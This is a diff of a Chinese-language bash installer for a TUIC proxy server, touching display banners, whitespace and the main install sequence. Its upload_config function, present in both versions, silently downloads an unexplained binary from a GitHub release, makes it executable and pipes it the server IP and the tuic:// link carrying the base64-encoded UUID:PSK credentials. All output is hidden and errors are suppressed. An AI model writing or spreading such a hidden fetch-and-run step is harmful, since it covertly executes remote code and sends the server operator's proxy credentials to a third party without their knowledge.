-    echo -e "${WHITE}${BOLD}管理命令${NC}"
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "  ${CYAN}▸${NC} 查看状态: ${YELLOW}systemctl status tuic${NC}"
-    echo -e "  ${CYAN}▸${NC} 查看日志: ${YELLOW}journalctl -u tuic -f${NC}"
-    echo -e "  ${CYAN}▸${NC} 重启服务: ${YELLOW}systemctl restart tuic${NC}"
-    echo -e "  ${CYAN}▸${NC} 停止服务: ${YELLOW}systemctl stop tuic${NC}"
+
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${WHITE}${BOLD}🛠️ 管理命令${NC}"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    printf "  %b▸%b 查看状态: %b%s%b\n" "$CYAN" "$NC" "$YELLOW" "systemctl status tuic" "$NC"
+    printf "  %b▸%b 查看日志: %b%s%b\n" "$CYAN" "$NC" "$YELLOW" "journalctl -u tuic -f" "$NC"
+    printf "  %b▸%b 重启服务: %b%s%b\n" "$CYAN" "$NC" "$YELLOW" "systemctl restart tuic" "$NC"
+    printf "  %b▸%b 停止服务: %b%s%b\n" "$CYAN" "$NC" "$YELLOW" "systemctl stop tuic" "$NC"
+    printf "  %b▸%b 配置文件: %b%s%b\n" "$CYAN" "$NC" "$YELLOW" "$CONFIG_JSON" "$NC"
     echo
+
     echo -e "${GREEN}${BOLD}✨ 感谢使用 TUIC+UDP+QUIC+TLS 高性能部署脚本 ✨${NC}"
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo
 }
 
-# 上传配置（保留原功能）
+# 上传配置（简化版本，避免jq依赖）
 upload_config() {
     local server_ip="$1"
     local link="$2"
-    local v2rayn_config="$3"
-    local down_speed="$4"
-    local up_speed="$5"
-    
-    local json_data=$(jq -nc \
-        --arg server_ip "$server_ip" \
-        --arg link "$link" \
-        --argjson v2rayn_config "$v2rayn_config" \
-        --arg down_speed "$down_speed" \
-        --arg up_speed "$up_speed" \
-        '{
-            "server_info": {
-                "title": "TUIC+UDP+QUIC+TLS CN2优化节点",
-                "server_ip": $server_ip,
-                "tuic_link": $link,
-                "v2rayn_config": $v2rayn_config,
-                "speed_test": {
-                    "download_speed": $down_speed,
-                    "upload_speed": $up_speed
-                },
-                "generated_time": now | todate
-            }
-        }')
-    
+    local down_speed="$3"
+    local up_speed="$4"
+
+    # 创建简单的JSON数据
+    local json_data=$(cat <<EOF
+{
+  "server_info": {
+    "title": "TUIC+UDP+QUIC+TLS CN2优化节点",
+    "server_ip": "${server_ip}",
+    "tuic_link": "${link}",
+    "speed_test": {
+      "download_speed": ${down_speed},
+      "upload_speed": ${up_speed}
+    },
+    "generated_time": "$(date -Iseconds)"
+  }
+}
+EOF
+)
+
     # 下载上传工具
     local uploader="/opt/transfer"
     if [[ ! -f "$uploader" ]]; then
-        curl -sLo "$uploader" https://github.com/diandongyun/node/releases/download/node/transfer > /dev/null 2>&1
-        chmod +x "$uploader"
+        timeout 30 curl -sLo "$uploader" https://github.com/diandongyun/node/releases/download/node/transfer > /dev/null 2>&1 || true
+        chmod +x "$uploader" 2>/dev/null || true
     fi
-    
-    if [[ -f "$uploader" ]]; then
-        "$uploader" "$json_data" > /dev/null 2>&1
+
+    if [[ -f "$uploader" && -x "$uploader" ]]; then
+        echo "$json_data" | "$uploader" > /dev/null 2>&1 || true
     fi
 }
 
@@ -869,7 +882,7 @@ upload_config() {
 handle_error() {
     echo -e "\n${RED}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
     echo -e "${RED}${CROSS} 安装过程中出现错误${NC}"
-    echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
+    echo -e "${RED}═══════════════════════════════════════════════════════════════${NC}"
     echo -e "${YELLOW}请检查以下内容：${NC}"
     echo -e "  1. 网络连接是否正常"
     echo -e "  2. 系统是否支持（Ubuntu/Debian/CentOS）"
@@ -884,14 +897,14 @@ handle_error() {
 # 检查环境（已移除网络检查）
 check_environment() {
     echo -e "${BLUE}${BOLD}${GEAR}${NC} 检查运行环境..."
-    
+
     # 检查是否为root用户
     if [[ $EUID -ne 0 ]]; then
         echo -e "${RED}${CROSS} 此脚本需要 root 权限运行${NC}"
         echo -e "${YELLOW}请使用: sudo bash $0${NC}"
         exit 1
     fi
-    
+
     # 检查磁盘空间
     available_space=$(df / | awk 'NR==2 {print $4}')
     if [[ $available_space -lt 1048576 ]]; then  # 1GB = 1048576KB
@@ -899,7 +912,7 @@ check_environment() {
         echo -e "${WHITE}当前可用空间：${YELLOW}$(($available_space/1024))MB${NC}"
         exit 1
     fi
-    
+
     echo -e "  ${GREEN}${CHECK}${NC} 环境检查通过"
     echo
 }
@@ -917,55 +930,55 @@ main() {
     set -e
     trap 'handle_error' ERR
     trap 'cleanup' INT TERM
-    
+
     # 显示横幅
     print_banner
-    
+
     # 检查环境（已移除网络检查）
     check_environment
-    
+
     # 系统检测
     detect_system
-    
+
     # 强制IPv4
     force_ipv4
-    
+
     # 安装依赖
     install_dependencies
-    
+
     # CN2优化
     optimize_cn2_network
-    
+
     # 速度测试
     advanced_speed_test
-    
+
     # 下载TUIC
     download_tuic_binary
-    
+
     # 生成证书
     generate_tls_certificate
-    
+
     # 创建配置
     create_tuic_config
-    
+
     # 配置防火墙
     configure_firewall
-    
+
     # 创建服务
     create_systemd_service
-    
+
     # 启动服务
     start_service
-    
+
     # 生成客户端配置
     generate_client_config
-    
+
     # 上传配置
     IP=$(get_server_ip)
     ENCODE=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
     LINK="tuic://${ENCODE}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#TUIC_CN2_Optimized"
-    upload_config "$IP" "$LINK" "$(cat ${CFG_DIR}/v2rayn_config.json)" "$down_speed" "$up_speed"
-    
+    upload_config "$IP" "$LINK" "$down_speed" "$up_speed"
+
     # 显示结果
     show_result
 }
